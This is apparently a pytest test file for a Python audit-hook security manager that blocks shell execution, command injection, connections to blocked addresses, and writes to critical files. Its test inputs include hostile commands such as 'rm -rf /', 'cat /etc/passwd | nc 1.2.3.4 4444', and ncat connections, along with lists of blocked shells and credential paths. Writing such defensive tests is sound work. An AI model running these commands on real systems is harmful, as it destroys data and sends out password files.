"""Unit tests for AuditHookManager in src/blackwall/audit/manager.py."""

import os
import sqlite3
import threading
import time
from unittest.mock import patch

import pytest

from blackwall.audit.manager import AuditHookManager, _active_managers


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_manager(tmp_path) -> AuditHookManager:
    """Create an isolated AuditHookManager backed by a tmp SQLite file."""
    db = tmp_path / "test_audit.db"
    return AuditHookManager(db_path=str(db))


def _seed_blocked_executable(manager: AuditHookManager, executable: str) -> None:
    """Insert a row into blocked_executables so the manager will block it."""
    conn = manager._get_conn()
    conn.execute(
        "INSERT OR IGNORE INTO blocked_executables (executable, created_at) VALUES (?, ?)",
        (executable, int(time.time())),
    )
    conn.commit()


def _seed_blocked_ioc(manager: AuditHookManager, ioc: str) -> None:
    """Insert a row into blocked_iocs so the manager will block the address."""
    conn = manager._get_conn()
    conn.execute(
        "INSERT OR IGNORE INTO blocked_iocs (ioc, type, created_at) VALUES (?, ?, ?)",
        (ioc, "IP", int(time.time())),
    )
    conn.commit()


# ---------------------------------------------------------------------------
# 1. test_init_defaults
# ---------------------------------------------------------------------------

class TestInitDefaults:
    def test_init_defaults(self, tmp_path):
        """AuditHookManager initialises with expected defaults."""
        db = tmp_path / "blackwall.db"
        mgr = AuditHookManager(db_path=str(db))

        assert mgr.db_path == str(db)
        assert mgr.enabled is False
        assert isinstance(mgr._local, threading.local)


# ---------------------------------------------------------------------------
# 2. test_start_stop_lifecycle
# ---------------------------------------------------------------------------

class TestStartStopLifecycle:
    def test_start_sets_enabled_and_registers(self, tmp_path):
        """start() sets enabled=True and adds manager to _active_managers."""
        mgr = _make_manager(tmp_path)
        try:
            mgr.start()
            assert mgr.enabled is True
            assert mgr in _active_managers
        finally:
            mgr.stop()

    def test_stop_clears_enabled_and_deregisters(self, tmp_path):
        """stop() sets enabled=False and removes manager from _active_managers."""
        mgr = _make_manager(tmp_path)
        mgr.start()
        mgr.stop()

        assert mgr.enabled is False
        assert mgr not in _active_managers

    def test_start_idempotent(self, tmp_path):
        """Calling start() twice does not duplicate the manager in the list."""
        mgr = _make_manager(tmp_path)
        try:
            mgr.start()
            mgr.start()
            count = sum(1 for m in _active_managers if m is mgr)
            assert count == 1
        finally:
            mgr.stop()

    def test_stop_when_not_started_is_safe(self, tmp_path):
        """stop() on a never-started manager does not raise."""
        mgr = _make_manager(tmp_path)
        mgr.stop()  # should not raise
        assert mgr.enabled is False


# ---------------------------------------------------------------------------
# 3. test_handle_event_when_disabled
# ---------------------------------------------------------------------------

class TestHandleEventWhenDisabled:
    def test_handle_event_no_op_when_disabled(self, tmp_path):
        """handle_event is a no-op when enabled=False; no PermissionError raised."""
        mgr = _make_manager(tmp_path)
        # enabled is False by default — calling any dangerous event should not raise
        mgr.handle_event("subprocess.Popen", ("/bin/sh", ["/bin/sh", "-c", "id"], {}, {}))
        mgr.handle_event("os.exec", ("/bin/sh",))
        mgr.handle_event("os.system", ("rm -rf /",))
        mgr.handle_event("open", ("/etc/passwd", "w"))


# ---------------------------------------------------------------------------
# 4. test_validate_subprocess_blocks
# ---------------------------------------------------------------------------

class TestValidateSubprocessBlocks:
    def test_subprocess_string_executable_raises(self, tmp_path):
        """_validate_subprocess raises PermissionError for a string executable."""
        mgr = _make_manager(tmp_path)
        with pytest.raises(PermissionError, match="Subprocess execution denied"):
            mgr._validate_subprocess(("/bin/ls", ["/bin/ls"], {}, {}))

    def test_subprocess_bytes_executable_raises(self, tmp_path):
        """_validate_subprocess raises PermissionError for a bytes executable."""
        mgr = _make_manager(tmp_path)
        with pytest.raises(PermissionError, match="Subprocess execution denied"):
            mgr._validate_subprocess((b"/bin/ls", [b"/bin/ls"], {}, {}))

    def test_subprocess_fallback_to_cmd_args_raises(self, tmp_path):
        """_validate_subprocess falls back to cmd_args[0] when executable is None."""
        mgr = _make_manager(tmp_path)
        with pytest.raises(PermissionError, match="Subprocess execution denied"):
            mgr._validate_subprocess((None, ["/usr/bin/curl"], {}, {}))

    def test_subprocess_too_short_args_is_safe(self, tmp_path):
        """_validate_subprocess with fewer than 2 args does not raise."""
        mgr = _make_manager(tmp_path)
        mgr._validate_subprocess(("/bin/ls",))  # only one arg — should return

    def test_handle_event_subprocess_raises_when_enabled(self, tmp_path):
        """handle_event raises PermissionError for subprocess.Popen when enabled."""
        mgr = _make_manager(tmp_path)
        mgr.start()
        try:
            with pytest.raises(PermissionError):
                mgr.handle_event("subprocess.Popen", ("/bin/ls", ["/bin/ls"], {}, {}))
        finally:
            mgr.stop()


# ---------------------------------------------------------------------------
# 5. test_validate_exec_blocks
# ---------------------------------------------------------------------------

class TestValidateExecBlocks:
    def test_exec_string_path_raises(self, tmp_path):
        """_validate_exec raises PermissionError for a string path."""
        mgr = _make_manager(tmp_path)
        with pytest.raises(PermissionError, match="Direct shell execution denied"):
            mgr._validate_exec(("/usr/bin/python3",))

    def test_exec_bytes_path_raises(self, tmp_path):
        """_validate_exec raises PermissionError for a bytes path."""
        mgr = _make_manager(tmp_path)
        with pytest.raises(PermissionError, match="Direct shell execution denied"):
            mgr._validate_exec((b"/usr/bin/python3",))

    def test_exec_empty_args_is_safe(self, tmp_path):
        """_validate_exec with zero args does not raise."""
        mgr = _make_manager(tmp_path)
        mgr._validate_exec(())

    def test_handle_event_exec_raises_when_enabled(self, tmp_path):
        """handle_event raises PermissionError for os.exec when enabled."""
        mgr = _make_manager(tmp_path)
        mgr.start()
        try:
            with pytest.raises(PermissionError):
                mgr.handle_event("os.exec", ("/bin/bash",))
        finally:
            mgr.stop()


# ---------------------------------------------------------------------------
# 6. test_validate_system_shell_metachar
# ---------------------------------------------------------------------------

class TestValidateSystemShellMetachar:
    """_validate_system blocks commands containing shell metacharacters."""

    @pytest.mark.parametrize("metachar,cmd", [
        (";",   "echo hello; rm -rf /"),
        ("&&",  "echo hello && rm -rf /"),
        ("||",  "false || rm -rf /"),
        ("|",   "cat /etc/passwd | nc 1.2.3.4 4444"),
        ("`",   "echo `id`"),
        ("$(",  "echo $(id)"),
        ("\n",  "echo hello\nrm -rf /"),
    ])
    def test_metachar_raises(self, tmp_path, metachar, cmd):
        """Each shell metacharacter triggers SYSTEM_COMMAND_INJECTION."""
        mgr = _make_manager(tmp_path)
        with pytest.raises(PermissionError, match="System command injection denied"):
            mgr._validate_system((cmd,))

    def test_metachar_bytes_raises(self, tmp_path):
        """Bytes command with metachar also raises PermissionError."""
        mgr = _make_manager(tmp_path)
        with pytest.raises(PermissionError, match="System command injection denied"):
            mgr._validate_system((b"echo hello; rm -rf /",))

    def test_clean_command_no_raise(self, tmp_path):
        """A plain command without metacharacters and not a shell does not raise."""
        mgr = _make_manager(tmp_path)
        # /usr/bin/env is not a shell name and has no metacharacters
        mgr._validate_system(("/usr/bin/env",))

    def test_empty_args_is_safe(self, tmp_path):
        """_validate_system with zero args does not raise."""
        mgr = _make_manager(tmp_path)
        mgr._validate_system(())


# ---------------------------------------------------------------------------
# 7. test_validate_system_blocked_executable
# ---------------------------------------------------------------------------

class TestValidateSystemBlockedExecutable:
    def test_blocked_executable_by_full_path(self, tmp_path):
        """_validate_system blocks a command whose full path is in blocked_executables."""
        mgr = _make_manager(tmp_path)
        _seed_blocked_executable(mgr, "/usr/bin/ncat")
        with pytest.raises(PermissionError, match="System command execution denied"):
            mgr._validate_system(("/usr/bin/ncat 1.2.3.4 4444",))

    def test_blocked_executable_by_basename(self, tmp_path):
        """_validate_system blocks a command whose basename is in blocked_executables."""
        mgr = _make_manager(tmp_path)
        _seed_blocked_executable(mgr, "nmap")
        with pytest.raises(PermissionError, match="System command execution denied"):
            mgr._validate_system(("/usr/bin/nmap -sV 1.2.3.4",))

    def test_shell_commands_always_blocked(self, tmp_path):
        """Built-in shell names (sh, bash, zsh, etc.) are always blocked."""
        mgr = _make_manager(tmp_path)
        for shell in ("sh", "bash", "zsh", "ksh", "csh", "dash", "ash"):
            with pytest.raises(PermissionError, match="System command execution denied"):
                mgr._validate_system((shell,))

    def test_shell_full_path_always_blocked(self, tmp_path):
        """Full path to a shell is blocked by basename match."""
        mgr = _make_manager(tmp_path)
        with pytest.raises(PermissionError, match="System command execution denied"):
            mgr._validate_system(("/bin/bash -c 'id'",))

    def test_non_blocked_executable_passes(self, tmp_path):
        """A command whose name is not in blocked_executables and not a shell passes."""
        mgr = _make_manager(tmp_path)
        # /usr/bin/date is not a shell and not in the DB
        mgr._validate_system(("/usr/bin/date",))


# ---------------------------------------------------------------------------
# 8. test_validate_socket_blocked_ioc
# ---------------------------------------------------------------------------

class TestValidateSocketBlockedIoc:
    def test_blocked_ip_raises(self, tmp_path):
        """_validate_socket raises PermissionError when IP is in blocked_iocs."""
        mgr = _make_manager(tmp_path)
        _seed_blocked_ioc(mgr, "10.0.0.1")
        with pytest.raises(PermissionError, match="Connection to malicious IOC blocked"):
            mgr._validate_socket((None, ("10.0.0.1", 4444)))

    def test_blocked_ip_port_pair_raises(self, tmp_path):
        """_validate_socket raises PermissionError when IP:port is in blocked_iocs."""
        mgr = _make_manager(tmp_path)
        _seed_blocked_ioc(mgr, "10.0.0.2:443")
        with pytest.raises(PermissionError, match="Connection to malicious IOC blocked"):
            mgr._validate_socket((None, ("10.0.0.2", 443)))

    def test_blocked_ip_string_address_raises(self, tmp_path):
        """_validate_socket raises PermissionError when string address is in blocked_iocs."""
        mgr = _make_manager(tmp_path)
        _seed_blocked_ioc(mgr, "evil.example.com")
        with pytest.raises(PermissionError, match="Connection to malicious IOC blocked"):
            mgr._validate_socket((None, "evil.example.com"))

    def test_unblocked_ip_passes(self, tmp_path):
        """_validate_socket allows connections to IPs not in blocked_iocs."""
        mgr = _make_manager(tmp_path)
        # No entries seeded — should pass silently
        mgr._validate_socket((None, ("8.8.8.8", 53)))

    def test_blocked_ip_but_different_port_passes(self, tmp_path):
        """Only exact IP:port match (not IP alone) is blocked when only IP:port row exists."""
        mgr = _make_manager(tmp_path)
        # Seed IP:port but NOT bare IP
        _seed_blocked_ioc(mgr, "10.0.0.3:8080")
        # Connection on a different port should pass
        mgr._validate_socket((None, ("10.0.0.3", 22)))

    def test_too_short_args_is_safe(self, tmp_path):
        """_validate_socket with fewer than 2 args does not raise."""
        mgr = _make_manager(tmp_path)
        mgr._validate_socket((None,))  # only one element


# ---------------------------------------------------------------------------
# 9. test_validate_open_critical_paths
# ---------------------------------------------------------------------------

class TestValidateOpenCriticalPaths:
    @pytest.mark.parametrize("path,mode", [
        ("/etc/passwd", "w"),
        ("/etc/shadow", "w+"),
        ("/etc/hosts", "a"),
        ("/etc/sudoers", "x"),
        ("/root/.profile", "w"),
        ("/root/", "w"),
        (os.path.expanduser("~/.bashrc"), "w"),
        (os.path.expanduser("~/.ssh/authorized_keys"), "w"),
        (os.path.expanduser("~/.ssh/id_rsa"), "w"),
        (os.path.expanduser("~/.ssh/"), "a"),
    ])
    def test_critical_path_write_raises(self, tmp_path, path, mode):
        """Writing to a critical path raises PermissionError."""
        mgr = _make_manager(tmp_path)
        with pytest.raises(PermissionError, match="File write access denied"):
            mgr._validate_open((path, mode))

    def test_etc_write_with_flags_raises(self, tmp_path):
        """_validate_open detects write via O_WRONLY flag."""
        mgr = _make_manager(tmp_path)
        with pytest.raises(PermissionError, match="File write access denied"):
            # mode=None, flags=O_WRONLY => is_write
            mgr._validate_open(("/etc/crontab", None, os.O_WRONLY))

    def test_etc_write_with_rdwr_flags_raises(self, tmp_path):
        """_validate_open detects write via O_RDWR flag."""
        mgr = _make_manager(tmp_path)
        with pytest.raises(PermissionError, match="File write access denied"):
            mgr._validate_open(("/etc/crontab", None, os.O_RDWR))

    def test_bytes_critical_path_raises(self, tmp_path):
        """_validate_open handles bytes paths to critical locations."""
        mgr = _make_manager(tmp_path)
        with pytest.raises(PermissionError, match="File write access denied"):
            mgr._validate_open((b"/etc/passwd", "w"))

    def test_fd_integer_path_is_safe(self, tmp_path):
        """_validate_open with an integer fd does not raise."""
        mgr = _make_manager(tmp_path)
        mgr._validate_open((3, "w"))  # integer fd — returns early

    def test_empty_path_is_safe(self, tmp_path):
        """_validate_open with zero args does not raise."""
        mgr = _make_manager(tmp_path)
        mgr._validate_open(())


# ---------------------------------------------------------------------------
# 10. test_validate_open_read_allowed
# ---------------------------------------------------------------------------

class TestValidateOpenReadAllowed:
    @pytest.mark.parametrize("path,mode", [
        ("/etc/passwd", "r"),
        ("/etc/hosts", "rb"),
        ("/root/.profile", "r"),
        (os.path.expanduser("~/.bashrc"), "r"),
        (os.path.expanduser("~/.ssh/authorized_keys"), "r"),
    ])
    def test_read_critical_path_does_not_raise(self, tmp_path, path, mode):
        """Reading critical paths is permitted (read-only mode)."""
        mgr = _make_manager(tmp_path)
        mgr._validate_open((path, mode))  # should not raise

    def test_no_mode_no_flags_is_read(self, tmp_path):
        """_validate_open with no mode and no flags defaults to read — does not raise."""
        mgr = _make_manager(tmp_path)
        mgr._validate_open(("/etc/passwd",))

    def test_rdonly_flag_is_allowed(self, tmp_path):
        """O_RDONLY flag (0) on /etc is not a write — should not raise."""
        mgr = _make_manager(tmp_path)
        mgr._validate_open(("/etc/passwd", None, os.O_RDONLY))


# ---------------------------------------------------------------------------
# 11. test_validate_open_non_critical_write_allowed
# ---------------------------------------------------------------------------

class TestValidateOpenNonCriticalWriteAllowed:
    @pytest.mark.parametrize("path,mode", [
        ("/tmp/safe_output.txt", "w"),
        ("/var/log/app.log", "a"),
        ("/home/user/document.txt", "w+"),
        ("/opt/app/data.bin", "wb"),
    ])
    def test_non_critical_write_does_not_raise(self, tmp_path, path, mode):
        """Writing to non-critical paths is permitted."""
        mgr = _make_manager(tmp_path)
        mgr._validate_open((path, mode))  # should not raise


# ---------------------------------------------------------------------------
# 12. test_report_violation_stores_incident
# ---------------------------------------------------------------------------

class TestReportViolationStoresIncident:
    def test_incident_row_inserted(self, tmp_path):
        """_report_violation inserts a row into audit_incidents before raising."""
        mgr = _make_manager(tmp_path)
        with pytest.raises(PermissionError, match="test violation"):
            mgr._report_violation(
                incident_type="TEST_INCIDENT",
                details="test details payload",
                error_msg="test violation",
            )

        conn = mgr._get_conn()
        row = conn.execute(
            "SELECT incident_type, details FROM audit_incidents WHERE incident_type = ?",
            ("TEST_INCIDENT",),
        ).fetchone()
        assert row is not None, "Expected audit_incidents row to be present"
        assert row[0] == "TEST_INCIDENT"
        assert "test details payload" in row[1]

    def test_incident_has_required_columns(self, tmp_path):
        """Stored incident row has all required fields populated."""
        mgr = _make_manager(tmp_path)
        with pytest.raises(PermissionError):
            mgr._report_violation(
                incident_type="COL_CHECK",
                details="column completeness check",
                error_msg="col check error",
            )

        conn = mgr._get_conn()
        row = conn.execute(
            "SELECT incident_id, incident_type, timestamp, details, stack_trace "
            "FROM audit_incidents WHERE incident_type = ?",
            ("COL_CHECK",),
        ).fetchone()
        assert row is not None
        incident_id, incident_type, timestamp, details, stack_trace = row
        assert incident_id  # UUID non-empty
        assert incident_type == "COL_CHECK"
        assert timestamp > 0
        assert details
        assert stack_trace  # traceback captured

    def test_multiple_incidents_accumulate(self, tmp_path):
        """Multiple violations produce multiple rows in audit_incidents."""
        mgr = _make_manager(tmp_path)
        for i in range(3):
            with pytest.raises(PermissionError):
                mgr._report_violation(
                    incident_type=f"MULTI_{i}",
                    details=f"detail {i}",
                    error_msg="err",
                )

        conn = mgr._get_conn()
        count = conn.execute("SELECT COUNT(*) FROM audit_incidents").fetchone()[0]
        assert count >= 3


# ---------------------------------------------------------------------------
# 13. test_handle_event_reentrance_guard
# ---------------------------------------------------------------------------

class TestHandleEventReentranceGuard:
    def test_reentrant_call_is_ignored(self, tmp_path):
        """Nested handle_event call while already handling is a no-op (no double-fire)."""
        mgr = _make_manager(tmp_path)
        mgr.start()

        call_count = {"inner": 0}
        original_evaluate = mgr._evaluate_event

        def _counting_evaluate(event, args):
            # Simulate re-entrance: call handle_event again from within _evaluate_event
            call_count["inner"] += 1
            if call_count["inner"] == 1:
                # This re-entrant call should be swallowed by the guard
                mgr.handle_event("open", ("/tmp/safe.txt", "r"))
            # We want the outer call to succeed without raising; use a no-op event
            # by calling the real evaluate only for non-blocking events
            if event == "unknown.event":
                original_evaluate(event, args)

        mgr._evaluate_event = _counting_evaluate

        try:
            # Fire a benign synthetic event
            mgr.handle_event("unknown.event", ())
            # The re-entrant inner call should have been suppressed
            assert call_count["inner"] == 1
        finally:
            mgr._evaluate_event = original_evaluate
            mgr.stop()

    def test_handling_flag_reset_after_exception(self, tmp_path):
        """The _handling flag is reset to False even when an exception is raised."""
        mgr = _make_manager(tmp_path)
        mgr.start()
        try:
            with pytest.raises(PermissionError):
                mgr.handle_event("subprocess.Popen", ("/bin/ls", ["/bin/ls"], {}, {}))

            # After the exception, handling must be cleared so the next call processes
            assert mgr._is_handling() is False
        finally:
            mgr.stop()

    def test_second_event_processes_after_first(self, tmp_path):
        """After a completed (or failed) event, the next event is processed normally."""
        mgr = _make_manager(tmp_path)
        mgr.start()
        try:
            with pytest.raises(PermissionError):
                mgr.handle_event("os.exec", ("/bin/sh",))

            # Second event must also raise (not be swallowed)
            with pytest.raises(PermissionError):
                mgr.handle_event("os.exec", ("/bin/bash",))
        finally:
            mgr.stop()


# ---------------------------------------------------------------------------
# 14. test_handle_event_slow_hook_warning
# ---------------------------------------------------------------------------

class TestHandleEventSlowHookWarning:
    def test_slow_hook_emits_warning(self, tmp_path):
        """handle_event logs a warning when execution exceeds 1ms."""
        mgr = _make_manager(tmp_path)
        mgr.start()

        # Sequence of perf_counter values: start, then start + 2ms (exceeds 1ms threshold)
        counter_values = iter([0.0, 0.002])

        try:
            with (
                patch("blackwall.audit.manager.time.perf_counter", side_effect=counter_values),
                patch("blackwall.audit.manager.logger") as mock_logger,
            ):
                # Use a benign event that does not raise
                mgr.handle_event("socket.connect", (None, ("127.0.0.1", 80)))

            mock_logger.warn.assert_called_once()
            call_kwargs = mock_logger.warn.call_args
            # First positional arg is the message string
            msg = call_kwargs[0][0]
            assert "1ms" in msg or "exceeded" in msg.lower() or "limit" in msg.lower()
        finally:
            mgr.stop()

    def test_fast_hook_does_not_warn(self, tmp_path):
        """handle_event does NOT log a warning when execution is below 1ms."""
        mgr = _make_manager(tmp_path)
        mgr.start()

        # Both reads return the same value → 0ms elapsed
        counter_values = iter([0.0, 0.0])

        try:
            with (
                patch("blackwall.audit.manager.time.perf_counter", side_effect=counter_values),
                patch("blackwall.audit.manager.logger") as mock_logger,
            ):
                mgr.handle_event("socket.connect", (None, ("127.0.0.1", 80)))

            mock_logger.warn.assert_not_called()
        finally:
            mgr.stop()
